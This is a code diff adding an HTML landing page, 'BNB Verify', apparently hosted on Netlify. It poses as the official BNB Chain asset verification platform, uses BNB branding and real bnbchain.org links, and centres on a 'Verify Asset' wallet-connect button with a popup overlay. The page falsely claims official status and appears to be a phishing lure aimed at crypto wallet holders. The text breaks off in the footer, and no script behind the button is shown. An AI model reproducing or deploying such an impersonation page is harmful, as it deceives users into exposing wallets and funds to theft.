@@ -1,1 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="preload" href="_next/static/media/4cf2300e9c8272f7-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+        <link rel="preload" href="_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+        <link rel="stylesheet" href="_next/static/css/ebf56a4e9a80851f.css" data-precedence="next"/>
+        <meta name="next-size-adjust" content=""/>
+        <title>BNB Verify - Secure Asset Verification</title>
+     <meta property="og:title" content="USDT Checker — Detect Flash (Fake) USDT vs Real USDT" />
+  <meta property="og:description" content="Verify USDT authenticity (ERC20/TRC20/BEP20). Learn what Flash USDT is and how to avoid scams." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://verifiedused.netlify.app/" />
+        <meta name="description" content="Check if a USDT transaction or token is real (official Tether) or a fake/Flash USDT scam. Enter a TxID, wallet or contract address for instant verification."/>
+        <script>
+            document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))
+        </script>
+        <style>
+            /* Loader */
+            .loader {
+                border: 3px solid #fff;
+                border-top: 3px solid transparent;
+                border-radius: 50%;
+                width: 16px;
+                height: 16px;
+                animation: spin 1s linear infinite;
+                display: none;
+            }
 
+            @keyframes spin {
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+
+            .loading .loader {
+                display: inline-block;
+            }
+
+            /* Overlay */
+            .overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.85);
+                backdrop-filter: blur(3px);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 99;
+                padding: 15px;
+            }
+
+            .popup {
+                background: #ffffff;
+                /* creamy white */
+                color: #000;
+                padding: 25px;
+
+                border-radius: 16px;
+                border: 2.2px solid gold;
+                width: 100%;
+                max-width: 360px;
+                text-align: center;
+                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+                animation: fadeIn 0.3s ease-out;
+            }
+
+            .popup h2 {
+                margin: 10px 0;
+                font-size: 20px;
+                font-weight: bold;
+                font-family: "Segoe UI", Tahoma, sans-serif;
+                color: gold;
+                /* yellow gold */
+                text-shadow: 0 0 6px rgba(255,215,0,0.1);
+            }
+
+            .section {
+                text-align: center;
+                margin: 18px 0;
+            }
+
+            .emoji-line {
+                display: flex;
+                align-items: center;
+                /* centers image & text vertically */
+                justify-content: center;
+                /* centers the whole row */
+                gap: 10px;
+                /* space between emoji and text */
+            }
+
+            .png_emoji {
+                width: 30px;
+                height: auto;
+            }
+
+            .png2_emoji {
+                width: 60px;
+                /* bigger for top icon */
+                height: auto;
+                display: block;
+                /* forces it above text */
+                margin: 0 auto 10px;
+                /* center + spacing below */
+            }
+
+            .png2_emoji2 {
+                width: 100px;
+                /* bigger for top icon */
+                height: auto;
+                display: block;
+                /* forces it above text */
+                margin: 0 auto 10px;
+                /* center + spacing below */
+            }
+
+            .inline-section, .inline-section2 {
+                display: flex;
+                align-items: center;
+                justify-content: flex-start;
+                margin: 35px 0;
+                background: rgba(209,183,59,0.1);
+                padding: 15px;
+                text-align: left;
+            }
+
+            .inline-section2 {
+                background: rgba(59,209,132,0.1);
+            }
+
+            .inline-section .emoji {
+                font-size: 30px;
+                width: 40px;
+                /* fixed width for perfect alignment */
+                text-align: center;
+            }
+
+            .text .title {
+                font-size: 18px;
+                font-weight: bold;
+            }
+
+            .text .subtitle {
+                font-size: 15px;
+                opacity: 1;
+                color: #403F3F;
+            }
+
+            .subtitle2 {
+                font-size: 15px;
+                opacity: 1;
+                margin-top: -10px;
+                font-weight: bold;
+                color: #403F3F;
+            }
+
+            .subtitle22 {
+                font-size: 15px;
+                opacity: 1;
+                font-weight: bold;
+                color: #403F3F;
+            }
+
+            .close-btn {
+                margin-top: 20px;
+                padding: 12px;
+                width: 100%;
+                font-size: 16px;
+                font-weight: bold;
+                border: none;
+                border-radius: 10px;
+                background: linear-gradient(45deg, #ff4d4d, #ff9900);
+                color: white;
+                cursor: pointer;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+                transition: transform 0.2s ease;
+            }
+
+            .close-btn:active {
+                transform: scale(0.96);
+            }
+
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                    transform: scale(0.9);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: scale(1);
+                }
+            }
+        </style>
+</head>
+
+   <body class="antialiased min-h-screen flex flex-col bg-white">
+        <div class="antialiased">
+            <main class="flex-1 flex flex-col">
+                <main class="relative min-h-screen overflow-hidden bg-white">
+                    <nav class="fixed top-0 left-0 right-0 z-50 backdrop-blur-md bg-white/90 border-b border-gray-200 shadow-sm">
+                        <div class="max-w-7xl mx-auto px-4 sm:px-6">
+                            <div class="flex justify-between items-center py-4">
+                                <div class="flex items-center">
+                                    <a class="flex items-center gap-2" href="index.html">
+                                        <img alt="BNB Logo" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" style="color:transparent" src="bnb.png"/>
+                                        <span class="text-amber-500 font-bold text-xl">BNB Chain</span>
+                                    </a>
+                                </div>
+                                <div class="hidden lg:flex items-center space-x-6">
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en">Home</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/blog">Support</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/contact">Contact Us</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://docs.bnbchain.org/docs/overview">Docs</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://bscscan.com/">Explorer</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/about">About</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/bridge">Bridge</a>
+                                    <a href="#verify" class="bg-gradient-to-r from-amber-500 to-yellow-400 text-white px-4 py-2 rounded-md font-medium hover:shadow-lg transition-all">Verify Now</a>
+                                </div>
+                                <div class="lg:hidden">
+                                    <button class="text-gray-700 hover:text-amber-500 transition-colors">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                                        </svg>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </nav>
+                    <div class="w-full pt-24 pb-16 bg-gradient-to-b from-white to-amber-50">
+                        <div class="space-y-16">
+                            <div class="max-w-6xl mx-auto px-4 sm:px-6">
+                                <div class="text-center mb-12">
+                                    <h1 class="text-4xl md:text-5xl font-bold text-gray-800 mb-4">
+                                        Verify Crypto Assets on <span class="text-amber-500">BNB Chain</span>
+                                    </h1>
+                                    <p class="text-xl text-gray-600 max-w-3xl mx-auto">The official platform for verifying and securing your BNB Chain assets</p>
+                                </div>
+                                <div class="max-w-3xl mx-auto">
+                                    <div class="rounded-xl text-card-foreground border border-amber-200 bg-white overflow-hidden relative animate-fade-in shadow-md" id="verify">
+                                        <div class="absolute inset-0 bg-gradient-to-br from-amber-50 to-white opacity-50"></div>
+                                        <div class="p-6 pt-6 pb-8 relative z-10">
+                                            <div class="flex flex-col items-center justify-between gap-6 text-center">
+                                                <div class="flex  w-full items-center justify-center mb-6 animate-fade-in" style="animation-delay:300ms">
+                                                    <div class="relative border border-amber-200 shadow-xl rounded-full p-4 w-28 h-28 md:w-36 md:h-36 flex items-center justify-center">
+                                                        <img alt="BNB Logo" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="w-full h-full object-contain " style="color:transparent" src="_next/static/media/bnb.c8612fc8.svg"/>
+                                                    </div>
+                                                </div>
+                                                <div class="inline-block px-4 py-1.5 border border-amber-400 bg-amber-50 text-amber-600 text-xs font-medium rounded-md mb-6 animate-slide-up">BNB CHAIN VERIFICATION</div>
+                                                <button id="connectBtn" class="inline-flex h-12 items-center justify-center rounded-lg bg-gradient-to-r from-amber-500 to-yellow-400 px-8 font-medium text-white transition-all hover:shadow-lg disabled:opacity-70 disabled:cursor-not-allowed">
+                                                    <span class="btn-text">Verify Asset</span>
+                                                    <span class="loader"></span>
+                                                </button>
+                                                <div class="max-w-md animate-slide-up" style="animation-delay:150ms">
+                                                    <p class="text-gray-600 mb-6 text-center">Verify your BNB Chain assets with our advanced security protocol. Protect against scams and ensure your transactions are secure.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="max-w-6xl mx-auto mt-16">
+                                    <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">Our Features</h2>
+                                </div>
+                            </div>
+                            <div class="w-full max-w-7xl mx-auto px-4 sm:px-6">
+                                <section class="w-full py-16 bg-gradient-to-b from-white to-amber-50 border-y border-gray-100">
+                                    <div class="max-w-7xl mx-auto px-6">
+                                        <h2 class="text-4xl font-bold text-amber-600 mb-12 text-center">Why Choose BNB Chain?</h2>
+                                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Unparalleled Speed</h3>
+                                                <p class="text-gray-600">Experience lightning-fast transaction confirmations with up to 3,000 TPS. BNB Chain offers one of the most responsive and efficient networks for all your digital asset needs.</p>
+                                            </div>
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Low Transaction Fees</h3>
+                                                <p class="text-gray-600">Save significantly with transaction fees as low as $0.01, making BNB Chain the most cost-effective solution for frequent traders and everyday users alike.</p>
+                                            </div>
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Enhanced Security</h3>
+                                                <p class="text-gray-600">Rest easy with multi-layered protection including real-time monitoring, automated verification protocols, and advanced fraud detection systems safeguarding your assets.</p>
+                                            </div>
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Seamless Integration</h3>
+                                                <p class="text-gray-600">Connect easily with 100+ major exchanges, wallets, and DeFi platforms through our standardized APIs and developer-friendly tools built for maximum compatibility.</p>
+                                            </div>
+                                        </div>
+                                        <div class="mt-12 text-center">
+                                            <a href="https://www.bnbchain.org/en/developers" target="_blank" rel="noopener noreferrer" class="inline-flex items-center space-x-2 bg-gradient-to-r from-amber-500 to-yellow-400 hover:shadow-lg transition-all px-8 py-4 rounded-lg text-white font-semibold">
+                                                <span>Get Started with BNB Chain</span>
+                                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                                                    <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                                                </svg>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </section>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+                <!--$-->
+                <!--/$-->
+                <!--$-->
+                <!--/$-->
+            </main>
+            <footer class="w-full border-t border-gray-200 bg-gradient-to-b from-gray-50 to-white mt-auto">
+                <div class="container mx-auto px-4 py-12 relative z-10">
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
+                        <div class="space-y-4 lg:col-span-2">
+                            <div class="flex items-center gap-2">
+                                <img alt="BNB Logo" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="rounded-md" style="color:transparent" src="bnb.png"/>
+                                <h3 class="text-xl font-bold text-amber-500">BNB Verify</h3>
+                            </div>
+                            <p class="text-sm text-gray-600 max-w-md">The official verification platform for BNB Chain assets. Our cutting-edge security protocols protect your investments and provide real-time verification with institutional-grade security standards.</p>
+                            <div class="pt-2">
+                                <a class="text-amber-500 hover:text-amber-600 font-medium flex items-center gap-1 text-sm" href="#verify">
+                                    Verify your assets now
+                                    
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="m9 18 6-6-6-6"></path>
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="space-y-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Products</h3>
+                            <ul class="space-y-2">
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">Token Verification</a>
+                                </li>
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">Smart Contract Audi
